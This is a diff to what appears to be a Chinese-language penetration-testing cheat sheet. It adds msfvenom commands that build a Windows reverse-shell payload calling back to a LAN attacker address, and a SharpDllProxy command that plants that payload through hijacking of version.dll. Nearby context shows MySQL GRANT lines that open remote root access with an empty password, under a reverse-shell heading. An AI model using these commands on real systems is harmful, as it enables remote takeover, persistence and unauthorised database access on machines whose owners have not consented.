@@ -144,6 +144,7 @@ show slave status	//查看master ip地址
 ```
 GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '' WITH GRANT OPTION;	//MYSQL开启外链语句
 GRANT ALL PRIVILEGES ON *.* TO ‘myuser’@'192.168.1.104′ IDENTIFIED BY ‘admin123′  WITH GRANT OPTION;	//MYSQL设置指定IP外链语句
+DELETE FROM `mysql`.`user` WHERE  `Host`='%' AND `User`='root'; //删除外链
 ```
 # 反弹shell
 ```
@@ -545,6 +546,11 @@ wget https://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS
   + https://github.com/MicrosoftArchive/redis/releases
 
   dll劫持
+  ```
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.131 LPORT=1337 -f c
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.131 LPORT=1337 -f raw -o payload_x64.bin
+  SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload payload_x64.bin
+  ```
   + https://s1gh.sh/discord-dll-hijacking-persistence/
   + https://0x191unauthorized.blogspot.com/2011/08/reverse-shell-through-dll-injection.html
 # mssql 2008 自定义dll提权
